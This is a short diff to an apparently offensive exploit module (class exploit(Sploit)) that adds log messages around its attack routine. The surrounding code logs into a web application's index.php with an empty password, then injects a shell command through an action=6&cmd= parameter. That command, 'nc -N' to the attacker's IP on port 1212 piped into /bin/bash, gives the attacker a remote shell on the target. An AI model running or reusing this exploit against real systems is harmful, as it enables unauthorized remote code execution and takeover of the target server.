@@ -50,6 +50,7 @@ class exploit(Sploit):
 
 	def attack(self):
 		session = requests.session()
+		self.log('Connecting to '+self.ip)
 		try:
 			url='http://'+self.url+'/index.php'
 			params={'frame':3,'pass':''}
@@ -60,10 +61,12 @@ class exploit(Sploit):
 			self.log(e)
 			sys.exit(1)
 		try:
+			self.log('Creating reverse connection...')
 	                x = threading.Thread(target=self.transfer, args=())
         	        x.start()
                 	#y = threading.Thread(target=self.listener, args=())
         	        #y.start()
+			self.log('Starting reverse connection..')
 	                command="nc -N "+self.ip+" 1212 | /bin/bash -"
                 	url=url+'?action=6&cmd='+command
 	                resp =session.get(url,timeout=3)
